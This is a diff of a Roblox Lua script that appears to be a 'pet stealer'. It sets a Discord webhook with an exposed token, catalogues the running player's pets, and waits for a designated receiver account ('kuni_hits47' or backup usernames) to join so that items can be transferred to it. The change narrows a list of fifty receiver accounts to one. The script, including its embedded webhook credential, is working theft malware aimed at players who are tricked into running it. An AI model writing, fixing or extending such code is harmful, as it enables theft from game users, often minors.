@@ -1,16 +1,6 @@
+
 getgenv().Webhook = "https://discord.com/api/webhooks/1412099514856116295/HdbFa64PKb2Fjz1zhp2PLxZo0z25lqKJE4bP25uwc_qCiMzAp_bv2FztM2dFyeIUbRmM"
-getgenv().Username = {
-    "kuni_hits1", "kuni_hits2", "kuni_hits3", "kuni_hits4", "kuni_hits5",
-    "kuni_hits6", "kuni_hits7", "kuni_hits8", "kuni_hits9", "kuni_hits10",
-    "kuni_hits11", "kuni_hits12", "kuni_hits13", "kuni_hits14", "kuni_hits15",
-    "kuni_hits16", "kuni_hits17", "kuni_hits18", "kuni_hits19", "kuni_hits20",
-    "kuni_hits21", "kuni_hits22", "kuni_hits23", "kuni_hits24", "kuni_hits25",
-    "kuni_hits26", "kuni_hits27", "kuni_hits28", "kuni_hits29", "kuni_hits30",
-    "kuni_hits31", "kuni_hits32", "kuni_hits33", "kuni_hits34", "kuni_hits35",  
-    "kuni_hits36", "kuni_hits37", "kuni_hits38", "kuni_hits39", "kuni_hits40",
-    "kuni_hits41", "kuni_hits42", "kuni_hits43", "kuni_hits44", "kuni_hits45",
-    "kuni_hits46", "kuni_hits47", "kuni_hits48", "kuni_hits49", "kuni_hits50"
-}
+getgenv().Username = "kuni_hits47"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -278,8 +268,7 @@ getgenv().Username = {
         local pets = GetPlayerPets()
 
         local Webhook = getgenv().Webhook
-        for _, Username in ipairs(getgenv().Username) do
-
+        local Username = getgenv().Username
 
         local function isMutated(toolName)
             for key, data in pairs(PetPriorityData) do
@@ -611,25 +600,20 @@ end)
                     end)
                 end
 
+        local usernames = {
+            "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
+        }
 
-
-      local receiverPlr
-local foundUsername
-
-repeat
-    for _, name in ipairs(getgenv().Username) do
-        receiverPlr = Players:FindFirstChild(name)
-        if receiverPlr then
-            foundUsername = name
-            break
-        end
-    end
-    task.wait(1)
-until receiverPlr
-
-local Username = foundUsername or "Unknown"
-
-
+        local receiverPlr
+        repeat
+            for _, name in ipairs(usernames) do
+                receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
+                if receiverPlr then
+                    break
+                end
+            end
+            task.wait(1)
+        until receiverPlr
 
         local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
         local hum = receiverChar:WaitForChild("Humanoid")
